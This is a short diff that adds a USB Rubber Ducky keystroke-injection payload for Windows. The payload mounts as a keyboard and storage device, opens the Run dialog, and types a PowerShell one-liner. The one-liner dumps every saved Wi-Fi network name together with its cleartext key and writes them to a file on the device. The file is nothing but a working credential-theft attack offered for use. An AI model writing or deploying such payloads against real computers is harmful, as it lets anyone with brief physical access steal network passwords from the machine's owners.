@@ -1,0 +1,9 @@
+REM USB Exfiltration Technique for Windows
+REM Saves known wireless LAN profiles (SSID & Key) to DUCKY
+
+ATTACKMODE HID STORAGE
+DELAY 2000
+GUI r
+DELAY 100
+STRING powershell -c "(netsh wlan show profiles) -match 'All' | % { $n=($_ -split ':')[1].Trim(); $k=(netsh wlan show profile $n key=clear | sls 'Key Content') -replace '.*:',''; \"$n :$k\" } >> D:\data\keys.txt"
+ENTER
